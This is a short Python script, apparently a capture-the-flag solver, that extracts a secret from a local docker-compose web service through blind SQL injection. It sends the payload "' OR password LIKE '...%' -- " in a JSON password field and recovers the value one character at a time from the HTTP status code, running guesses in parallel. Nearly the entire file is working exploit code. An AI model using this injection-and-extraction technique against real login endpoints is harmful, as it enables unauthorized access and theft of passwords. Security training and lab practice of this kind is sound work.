import string, requests
from repeat import repeat

# first run docker-compose up in a terminal

@repeat(
    string.ascii_letters + string.digits + '_-',
    30
)
def get_flag(candidate_string: str) -> bool:
    escaped_string = candidate_string.replace('_', '\\_')
    payload = f"' OR password LIKE '{escaped_string}%' -- "
    r = requests.post(
        'http://localhost:8080',
        json={
            'password': payload
        }
    )
    return r.status_code == 200


if __name__ == '__main__':
    flag = get_flag(
        parallelism=5
    )
    print()
    print(flag)
